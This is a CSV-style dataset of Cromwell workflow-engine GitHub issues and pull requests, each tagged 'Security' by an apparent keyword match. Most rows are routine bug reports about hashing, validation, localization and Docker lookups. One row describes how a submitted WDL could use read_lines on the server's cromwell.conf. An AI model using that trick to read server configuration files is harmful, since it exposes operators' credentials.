Security,Cromwell engine DRS checksum [BT-389],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6683:20,checksum,checksum,20,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6683,1,['checksum'],['checksum']
Security,"Cromwell is localizing inputs to unconventionally named directories. Specifically directories starting with a '-'. - is conventionally used in program arguments to mean 'not a path, this is an option'. This is a pain. Previously cromwell was localising with a full path, but now seems to be using some kind of hash prefixed with an '-'. Maybe you meant to use an unsigned int?. ```; ls cromwell-executions/PreProcessingForVariantDiscovery_GATK4/51a9f551-defa-4e20-8573-d55d25622248/call-SamToFastqAndBwaMem/inputs/; -1232659437/ -21323395/ -941963188/; cd cromwell-executions/PreProcessingForVariantDiscovery_GATK4/51a9f551-defa-4e20-8573-d55d25622248/call-SamToFastqAndBwaMem/inputs/; cd -941963188; cd: Unknown option “-941963188”; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3824:310,hash,hash,310,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3824,1,['hash'],['hash']
Security,Cromwell metadata servers in FC prod have been brought down by repeated requests for the same workflow metadata before a response has been returned for the first request. It should be fairly easy to implement a requesters map that would allow Cromwell to only assemble metadata once and respond to all requests with that same metadata. The implementation here could be very similar to (though simpler than) the [file hash caching](https://github.com/broadinstitute/cromwell/pull/4143/files) system.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4226:417,hash,hash,417,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4226,1,['hash'],['hash']
Security,"Cromwell piece of hashing, closes #490",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/510:18,hash,hashing,18,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/510,1,['hash'],['hashing']
Security,"Cromwell seems to erroneously treat private/internal variables with File type as input files and attempts to localize them:. ```; version 1.0. task mytask {; 	input {; 		String mystr = ""Hello World!""; 	}. 	File myfile = ""myfile"". 	command <<<; 		echo ~{mystr} > ~{myfile}; 	>>>. 	output {; 		String file_contents = read_string(myfile); 	}; }. workflow wf {; 	call mytask; }; ```. ```; Could not localize myfile -> /home/jared/projects/gambit/data/misc/211031-apollo_illumina_pe-miniwdl/test-cromwell/cromwell-executions/wf/51d2f863-0e91-45b6-9e7b-f2365c259144/call-mytask/inputs/1979661608/myfile:; 	myfile doesn't exist; 	File not found /home/jared/projects/gambit/data/misc/211031-apollo_illumina_pe-miniwdl/test-cromwell/cromwell-executions/wf/51d2f863-0e91-45b6-9e7b-f2365c259144/call-mytask/inputs/1979661608/myfile -> /home/jared/projects/gambit/data/misc/211031-apollo_illumina_pe-miniwdl/test-cromwell/myfile; 	File not found myfile; 	File not found /home/jared/projects/gambit/data/misc/211031-apollo_illumina_pe-miniwdl/test-cromwell/myfile; 	at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:94); 	at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:90); 	at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:669); 	... 35 common frames omitted; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6562:1063,validat,validation,1063,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6562,8,"['Validat', 'validat']","['Validation', 'ValidationTry', 'validation']"
Security,Cromwell should validate output of a task before running it,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2226:16,validat,validate,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2226,1,['validat'],['validate']
Security,"Cromwell will need to provide an endpoint called status which will return a 200 with other information on subsystems. For examples of how this was implemented in Rawls, see their [StatusService](https://github.com/broadinstitute/rawls/blob/eccaae155ef7a7bba7cbd7403405beb155a723a9/core/src/main/scala/org/broadinstitute/dsde/rawls/status/StatusService.scala) and [HealthMonitor](https://github.com/broadinstitute/rawls/blob/eccaae155ef7a7bba7cbd7403405beb155a723a9/core/src/main/scala/org/broadinstitute/dsde/rawls/monitor/HealthMonitor.scala). Subsystems to monitor include the CloudSQL database, Dockerhub, GCS and PAPI. If you can think of something else which seems useful feel free to add it in. This endpoint should also be exposed via CromIAM w/o needing authZ",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2432:730,expose,exposed,730,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2432,1,['expose'],['exposed']
Security,Cromwell with aws s3: Access Denied,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4677:22,Access,Access,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4677,1,['Access'],['Access']
Security,"Cromwell won't validate you, despite its promises.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1427:15,validat,validate,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1427,1,['validat'],['validate']
Security,"Cromwell: Development (`37-3b2affa`); Backend: HPC (`ConfigBackendLifecycleActorFactory`). I wanted access to a recently merged pull request (#4437), so I built a development version of Cromwell. However, when I run it with the same configuration file as I used for Cromwell 36, I get this error:; ```; [ERROR] [01/24/2019 11:10:24.126] [cromwell-system-akka.actor.default-dispatcher-4] [akka://cromwell-system/user/SingleWorkflowRunnerActor] No configuration setting found for key 'services' ; akka.actor.ActorInitializationException: akka://cromwell-system/user/SingleWorkflowRunnerActor/ServiceRegistryActor: exception during creation ; at akka.actor.ActorInitializationException$.apply(Actor.scala:193) ; at akka.actor.ActorCell.create(ActorCell.scala:669) ; at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:523) ; at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545) ; at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283) ; at akka.dispatch.Mailbox.run(Mailbox.scala:224) ; at akka.dispatch.Mailbox.exec(Mailbox.scala:235) ; at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) ; at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) ; at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) ; at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) ; Caused by: com.typesafe.config.ConfigException$Missing: No configuration setting found for key 'services' ; at com.typesafe.config.impl.SimpleConfig.findKeyOrNull(SimpleConfig.java:156) ; at com.typesafe.config.impl.SimpleConfig.findOrNull(SimpleConfig.java:174) ; at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:188) ; at com.typesafe.config.impl.SimpleConfig.find(SimpleConfig.java:193) ; at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:268) ; at com.typesafe.config.impl.SimpleConfig.getObject(SimpleConfig.java:41) ; at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegi",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4577:100,access,access,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4577,1,['access'],['access']
Security,CromwellApiHandler now uses a ValidateActor to validate a WF received via the API endpoint,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548:30,Validat,ValidateActor,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548,2,"['Validat', 'validat']","['ValidateActor', 'validate']"
Security,"CromwellApiService issues a `ValidateWorkflowId` to the metadata service, breaking our rule of not reading from metadata internally. This is problematic if e.g. one is using a write-only metadata implementation.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3104:29,Validat,ValidateWorkflowId,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3104,1,['Validat'],['ValidateWorkflowId']
Security,"Crossposting here as I was not able to get an answer on WDL forum. Post is here:; https://gatkforums.broadinstitute.org/wdl/discussion/13540/unable-to-do-docker-lookup#latest. Trying to get hello world working on AWS Batch and cromwell. I am able to spin up the servers however it fails in pulling the docker image with the following error message in the cromwell logs:. `; 2018-10-30 15:43:14,845 cromwell-system-akka.dispatchers.engine-dispatcher-9 WARN - BackendPreparationActor_for_7d0c30ad:wf_hello.hello:-1:1 [UUID(7d0c30ad)]: Docker lookup failed java.lang.Exception: Failed to get docker hash for ubuntu:latest Docker hash lookup failed with code 503. The server is currently unavailable (because it is overloaded or down for maintenance). at cromwell.engine.workflow.WorkflowDockerLookupActor.cromwell$engine$workflow$WorkflowDockerLookupActor$$handleLookupFailure(WorkflowDockerLookupActor.scala:188); `. Here is my wdl:. ```; task hello {; String addressee; command {; echo ""Hello ${addressee}! Welcome to Cromwell on AWS""; }; output {; String message = read_string(stdout()); }; runtime {; docker: ""ubuntu:latest""; }; }. workflow wf_hello {; call hello. output {; hello.message; }; }; ```. This is originally from tutorial by @wleepang found here:; https://www.youtube.com/watch?v=jcC3pz_K4gI. Any idea on how to diagnose? I was not able to find a similar issue. Thanks so much for the help.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4345:596,hash,hash,596,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4345,2,['hash'],['hash']
Security,"Currently a new job definition is created per job submitted to AWS Batch. There should be built into AwsBatchJob.scala a mechanism to reuse definitions. One thought here is to perform a hash of the parameters used to create a job definition, then setting the job definition name to that hash. It is then relatively easy to perform a describeJobDefinitions call against aws batch to look for that name, and create it if it does not exist.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3750:186,hash,hash,186,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3750,2,['hash'],['hash']
Security,"Currently default runtime attributes are typechecked in the backend-specific runtime attribute classes (e.g. `JesRuntimeAttributes`, `LocalRuntimeAttributes`, etc) using attribute name to type mappings that are backend-specific. With our current static backend selection scheme, MWDA knows the backend to which a task will be sent at validation time. So while it's currently possible to refactor to expose backend-specific default runtime attribute typechecking to MWDA, that system would break down with a dynamic backend selection scheme. . It's also not clear how MWDA-composed runtime attributes would be handed to the backend-specific runtime attribute classes for the more substantive ""beyond typechecking"" round of validation and execution. It's possible we could copy the `NamespaceWithWorkflow` and write the relevant attributes into the tasks, but I'm not sure if we'd get into trouble later with bindings that no longer agree with the AST.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1076#issuecomment-231157891:334,validat,validation,334,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1076#issuecomment-231157891,6,"['expose', 'validat']","['expose', 'validation']"
Security,"Currently it barfs on aliased call commands yielding the following error:; ```; Exception in thread ""main"" wdl4s.parser.WdlParser$SyntaxError: ERROR: Expression references output on call that doesn't exist (line 1572, col 5):. ValidateCram.*; ^; ; 	at wdl4s.Workflow.$anonfun$expandedWildcardOutputs$5(Workflow.scala:166); 	at scala.collection.TraversableLike.$anonfun$flatMap$1(TraversableLike.scala:241); 	at scala.collection.immutable.List.foreach(List.scala:378); 	at scala.collection.TraversableLike.flatMap(TraversableLike.scala:241); 	at scala.collection.TraversableLike.flatMap$(TraversableLike.scala:238); 	at scala.collection.immutable.List.flatMap(List.scala:341); ```. FYI: `ValidateCram` was called as such in the file:; ```; call ValidateSamFile as ValidateCram {; input:; input_bam = ConvertToCram.output_cram,; input_bam_index = ConvertToCram.output_cram_index,; report_filename = sample_name + "".cram.validation_report"",; .....; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2125:227,Validat,ValidateCram,227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2125,4,['Validat'],"['ValidateCram', 'ValidateSamFile']"
Security,"Currently only a draft since I'd like to hear from others:; - how deeply folks want this CI tested (is a unit test using mock auth enough?); - if folks think this copied code should be moved down into the standard backends, since GAR/GAR can be public-but-authenticated just like DockerHub, Quay, etc",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6742#issuecomment-1108047748:256,authenticat,authenticated,256,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6742#issuecomment-1108047748,1,['authenticat'],['authenticated']
Security,Currently running as `cromwell-cron-papiv2-alpha1` job 730 for validation,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5750:63,validat,validation,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5750,1,['validat'],['validation']
Security,Currently the endpoints not off of `/api` (e.g. `/engine/Segment/version`) still require an authorization header. This should not be the case. These endpoints should be fully public.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2766:92,authoriz,authorization,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2766,1,['authoriz'],['authorization']
Security,"Currently we have the ability to turn caching on/off at a cromwell level, or a workflow level, but sometimes there are specific tasks in a workflow that should either participate or not in call caching. Similar to the workflow options, a task-level runtime set of options should exist to expose this behavior:; write_to_cache: don't add the results of this call to the cache; read_from_cache: don't attempt to use the cache for this call. Requested by Lee as they migrate off Queue",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1695:288,expose,expose,288,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1695,1,['expose'],['expose']
Security,"Currently when I ask for metadata or for logs, I get something like:; ```; {; ""calls"": {; ""annotate_de_novo.transdecoder"": [; {; ""stderr"": ""/pipelines/cromwell_1/cromwell-executions/annotate_de_novo/e64a866e-d5c1-4779-8f9d-75457f22f43e/call-transdecoder/execution/stderr"",; ""stdout"": ""/pipelines/cromwell_1/cromwell-executions/annotate_de_novo/e64a866e-d5c1-4779-8f9d-75457f22f43e/call-transdecoder/execution/stdout"",; ""attempt"": 1,; ""shardIndex"": -1; }; ]; },; ""id"": ""e64a866e-d5c1-4779-8f9d-75457f22f43e""; }; ```; All the details about what really happened (stderr and stdout of the tools that failed) are not accessible via REST API and I have to ssh to the server to read those files. What can be useful is to have a way to get stdout/stderr content for each call with Cromwell REST API, that can save a lot of time on ssh-ing.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2928:612,access,accessible,612,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2928,1,['access'],['accessible']
Security,"Currently when an external user attempts to access our cloud accounts, Travis does not hand out the encryption keys. This is desired behavior, as we do not want to run up bills on unknown code from outside users. However, currently our test scripts are not checking the variable [`TRAVIS_SECURE_ENV_VARS`](https://docs.travis-ci.com/user/environment-variables/#Default-Environment-Variables), and are instead trying to access encrypted variables that are not and never will be present. This leads to false negatives where the tests are marked as failed, when instead they should best case be marked as ignored, worst case be marked as implicitly passed.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1717:44,access,access,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1717,4,"['access', 'encrypt']","['access', 'encrypted', 'encryption']"
Security,"Currently, the file systems available to the engine for functions like read_\* are statically defined. GCS, Local, etc. This issue is to make that driven by the config file. The reason this is important is because if you are running a cromwell server and can not disable the ""Local Shared Filesystem"" from the engine... someone could write a WDL that does a read_ on any file that the cromwell server has access to (e.g. read_lines(""./cromwell.conf"")... which is bad",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/821:405,access,access,405,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/821,1,['access'],['access']
Security,"D OTHER SENSITIVE MATERIAL: -->; I am running Cromwell on GCP, launching a workflow that shards into ~5,000 pieces. I am getting the following error: `cromwell-system-akka.dispatchers.backend-dispatcher-150 ERROR - Read timed out`. ```; 2019-04-29 00:02:13,419 cromwell-system-akka.dispatchers.backend-dispatcher-139 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(95b34a77)vcf2bigquery.convertVCF:2058:1]: Status chang; e from Running to Success; 2019-04-29 00:02:24,760 cromwell-system-akka.dispatchers.backend-dispatcher-150 ERROR - Read timed out; java.net.SocketTimeoutException: Read timed out; at java.net.SocketInputStream.socketRead0(Native Method); at java.net.SocketInputStream.socketRead(SocketInputStream.java:116); at java.net.SocketInputStream.read(SocketInputStream.java:171); at java.net.SocketInputStream.read(SocketInputStream.java:141); at sun.security.ssl.InputRecord.readFully(InputRecord.java:465); at sun.security.ssl.InputRecord.read(InputRecord.java:503); at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:975); at sun.security.ssl.SSLSocketImpl.readDataRecord(SSLSocketImpl.java:933); at sun.security.ssl.AppInputStream.read(AppInputStream.java:105); at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); at java.io.BufferedInputStream.read(BufferedInputStream.java:345); at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:735); at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:678); at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1587); at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1492); at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:347); at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); at com.google.api.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4914:1770,secur,security,1770,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4914,1,['secur'],['security']
Security,DO NOT MERGE: example code... seems to work for access tokens initially... don't ha…,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/197:48,access,access,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/197,1,['access'],['access']
Security,DSDEEPB-1178 Add validate to the Cromwell routes.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/166:17,validat,validate,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/166,1,['validat'],['validate']
Security,Data access index aware for scatter-gather,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/156:5,access,access,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/156,1,['access'],['access']
Security,Data access via DRS URIs frequently fails in Ammonite script,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5069:5,access,access,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5069,1,['access'],['access']
Security,"Dear Cromwell dev team,. This is an enhancement suggestion. . When using the google backend for resources allocation, one can specify `gpuCount` and `gpuType` to request for specific resources. I am currently trying to design a task that optionally needs to access a GPU (function of input/parameters). I tried different approach to dynamically schedule GPUs, but `gpuCount` seems constrain to a non-null positive integer. https://github.com/broadinstitute/cromwell/blob/bfef756ca35b46570dff3fda57f77dd4b2b0d25c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiRuntimeAttributes.scala#L190 . https://github.com/broadinstitute/cromwell/blob/bfef756ca35b46570dff3fda57f77dd4b2b0d25c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/GpuValidation.scala#L28-L40. To allow for dynamic access to GPUs, I propose to extend `gpuCount` type to allow for a null value, and to check for a non-null value for resource allocation. https://github.com/broadinstitute/cromwell/blob/bfef756ca35b46570dff3fda57f77dd4b2b0d25c/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiRuntimeAttributes.scala#L193. Please let me know if such a feature is not desired for any reason. . \* I tried accessing the Jira tracker but `doesn't have access to Jira on broadworkbench.atlassian.net.`",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6679:258,access,access,258,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6679,4,['access'],"['access', 'accessing']"
Security,"Dear developers,. During testing I ran into the problem that the `HashPathStrategy` does not include the last modified date of the file. It assumes: ""if the path is there, it is the same file"". This is not necessarily the case. Files can be modified or replaced.Therefore the current `HashPathStrategy` is a big liability when trying to get reproducible results. By adding a ""last modified date"" to the `HashPathStrategy` this will ensure that nothing has happened to the file from the user or system side. This of course is not as safe as the `HashFileStrategy` since it does not protect against filesystem or hardware errors, but it provides a lot more safety compared to the current `HashPathStrategy`. ; This is also how Snakemake checks if files are the same and it works quite well. Alternatively there could be an option in the Configfile that allows you to set this behaviour. Please let me know what you think of this.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4405:66,Hash,HashPathStrategy,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4405,5,['Hash'],"['HashFileStrategy', 'HashPathStrategy']"
Security,"Define a `WomExpression` `trait` or `abstract class`; It should have an abstract `evaluate` method taking WOM I/O functions as well as some kind of ""variable context"" containing values for the variable referenced in the expression (likely a `Map[String, WomValue]` of some sort).The values should be accurate. E.g: correct shard index if inside the same scatter, array of all shards if outside etc... It should also expose a Set of variables referenced in the expression. Other methods might reveal themselves useful / needed as this is built. WDL and CWL will implement this abstract class and provide their own implementation of the abstract methods.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2522:416,expose,expose,416,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2522,1,['expose'],['expose']
Security,"Defining inputs in a call overwrites/affects inputs to other calls when these inputs have the same name. This happens in cromwell 34, as well as the develop version (9bee537). It happens for WDL version 1.0 and Biscayne, but not for draft-2. example:; ```; version 1.0; workflow test {; String out = ""hello""; call echo1 { #Should run `echo hello1`, but runs `echo21` if run second; input:; out = out + ""1""; }; call echo2 { #should run `echo hello2`, but runs `echo 12` if run second; input:; out = out + ""2""; }; }; task echo1 {; input {; String out; }; command {; echo ~{out}; }; }; task echo2 {; input {; String out; }; command {; echo ~{out}; }; }; ```; I added the echo task twice to check if it might be caused by running the same task multiple times, but this also happens when it's two different tasks with equally named inputs. Defining one or both inputs as variables before passing them to the call seems works as expected:; ```; workflow test {; String out = ""hello""; call echo1 { # runs `echo hello1`; input:; out = out + ""1""; }; String out2 = out + ""2""; call echo2 { # runs `echo hello2`; input:; out = out2; }; }; ```. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3999:1886,PASSWORD,PASSWORDS,1886,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3999,1,['PASSWORD'],['PASSWORDS']
Security,Deny access to stats endpoint,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2137:5,access,access,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2137,1,['access'],['access']
Security,Dependency injection version of a draft2/draft3 split,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3234:11,inject,injection,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3234,1,['inject'],['injection']
Security,"Developer notes:. When first launching single workflow mode, Cromwell calls `cromwell.CommandLineArguments#validateSubmission` and generates a `cromwell.CommandLineArguments.ValidSubmission` if the submission looks good. `ValidSubmission` has the appearance of supporting directories because it has the member `dependencies`. In [both](https://github.com/broadinstitute/cromwell/blob/9249537fd094c6979b0c64e99fcc90d48c861487/server/src/main/scala/cromwell/CromwellEntryPoint.scala#L229) [places](https://github.com/broadinstitute/cromwell/blob/9249537fd094c6979b0c64e99fcc90d48c861487/server/src/main/scala/cromwell/CromwellEntryPoint.scala#L249) where `validateSubmission` is actually called, however, we copy the value into another variable that is named & treated as the path to a zip file.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5693#issuecomment-672004178:107,validat,validateSubmission,107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5693#issuecomment-672004178,2,['validat'],['validateSubmission']
Security,"Did some testing with the Dockstore team and concluded that ghcr.io images do technically seem to be getting pulled, but there's an issue with the hash. In the short term it might be acceptable to make the warning explain what ""not supported"" actually means, but ghcr.io seems to be increasing in popularity so it's likely best to add full official support.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6827#issuecomment-1218465541:147,hash,hash,147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6827#issuecomment-1218465541,1,['hash'],['hash']
Security,"Differences might be:; - documentation; - authentication; - no `stats` endpoint. (depending on how Swagger actually works, some of these might be unnecessary/for free)",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2148:42,authenticat,authentication,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2148,1,['authenticat'],['authentication']
Security,DigestUtils.java:794); Mar 09 00:55:25 web start-cromwell.sh[110916]: at org.apache.commons.codec.digest.DigestUtils.digest(DigestUtils.java:50); Mar 09 00:55:25 web start-cromwell.sh[110916]: at org.apache.commons.codec.digest.DigestUtils.md5(DigestUtils.java:274); Mar 09 00:55:25 web start-cromwell.sh[110916]: at org.apache.commons.codec.digest.DigestUtils.md5Hex(DigestUtils.java:310); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.HashFileStrategy.$anonfun$hash$3(ConfigHashingStrategy.scala:82); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.util.TryWithResource$.$anonfun$tryWithResource$1(TryWithResource.scala:16); Mar 09 00:55:25 web start-cromwell.sh[110916]: at scala.util.Try$.apply(Try.scala:209); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.util.TryWithResource$.tryWithResource(TryWithResource.scala:10); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.HashFileStrategy.hash(ConfigHashingStrategy.scala:82); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.usingStandardInitData$1(ConfigHashingStrategy.scala:52); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:57); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.impl.sfs.config.ConfigBackendFileHashingActor.customHashStrategy(ConfigBackendFileHashingActor.scala:26); Mar 09 00:55:25 web start-cromwell.sh[110916]: at cromwell.backend.standard.callcaching.StandardFileHashingActor$$anonfun$fileHashingReceive$1.applyOrElse(StandardFileHashingActor.scala:73); Mar 09 00:55:25 web start-cromwell.sh[110916]: at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); Mar 09 00:55:25 web start-cromwell.sh[110916]: at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); Mar 09 00:55:25 web start-cromwell.sh[110916]: at akka.actor.Actor,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3383:2648,hash,hash,2648,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3383,1,['hash'],['hash']
Security,"Directory structure:. ```; WDLTesting; -src; --wdl; ---Workflow.wdl; ---WriteTask.wdl; ---Child; ----ChildWF.wdl; ----ChildTask.wdl; ```. Under draft 2 (which is to say, no version specified), Workflow.wdl has the following import statements:; ```; import ""WDLTesting/src/wdl/WriteTask.wdl"" as Write; import ""WDLTesting/src/wdl/Child/ChildWF.wdl"" as Child; ```; ChildWF.wdl has the following import statement:; `import ""WDLTesting/src/wdl/Child/ChildTask.wdl"" as Child`. This works correctly. it works letting things be access from the file system, and it works if we zip up WDLTesting and pass it to Cromwell as --imports. Under version development, this doesn't work. Workflow.wdl's imports still work, but ChildWF.wdl's do not. I must trim it down to ; `import ""Child/ChildTask.wdl"" as Child`; Before it will work. This completely breaks our pipeline, especially since workflows calling files up and down the tree, and even in other projects that start at the same level as ours. Why was this horrible breaking change made, and how do we specify an import that works with respect to the --imports .zip?. Thank 